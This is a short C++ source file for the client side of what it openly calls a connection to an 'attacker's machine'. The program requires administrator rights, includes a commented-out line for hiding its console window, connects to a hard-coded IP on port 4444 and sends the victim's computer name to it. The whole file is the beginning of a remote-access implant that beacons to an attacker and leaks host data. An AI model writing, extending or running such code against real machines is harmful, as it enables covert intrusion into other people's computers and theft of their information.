// client.cpp
// this code will try to connect to attacker's machine

#include "client.h"

bool isAdmin() { // check is program running with admin rights
    bool isElevated = false;
    HANDLE token;
    TOKEN_ELEVATION elev;
    DWORD size;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        if (GetTokenInformation(token, TokenElevation, &elev, sizeof(elev), &size)) {
            isElevated = elev.TokenIsElevated;
        }
    }
    if (token) {
        CloseHandle(token);
        token = NULL;
    }
    return isElevated;
}

int Client::connect_to(short port, char *ip) {
    // FreeConsole(); // hide console window

    if (!isAdmin()) {
        MessageBox(NULL, "Run this as administrator!", "Fatal error", MB_ICONERROR | MB_OK);
        return -1;
    }

    DllVersion = MAKEWORD(2, 1);
    if (WSAStartup(DllVersion, &wsaData) != 0) {
        exit(1);
    }

    int sizeAddr = sizeof(addr);
    addr.sin_addr.s_addr = inet_addr(ip);
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;

    connection = socket(AF_INET, SOCK_STREAM, 0);
    if (connect(connection, (SOCKADDR*)&addr, sizeAddr) != 0) {
        MessageBox(NULL, "Socket connection error!", "Fatal error", MB_ICONERROR | MB_OK);
        printf("Error: %d\n", WSAGetLastError());
        return -1;
    }
}

void Client::get_computer_name(SOCKET socket) {
    char name[256];
    gethostname(name, sizeof(name));

    int result = send(socket, name, sizeof(name), 0);
    if (result == SOCKET_ERROR) printf("Error: %d\n", WSAGetLastError());
}

int main() 
{
    Client main_client;
    main_client.connect_to(4444, "192.168.31.135");
    main_client.get_computer_name(main_client.connection);

    return 0;
}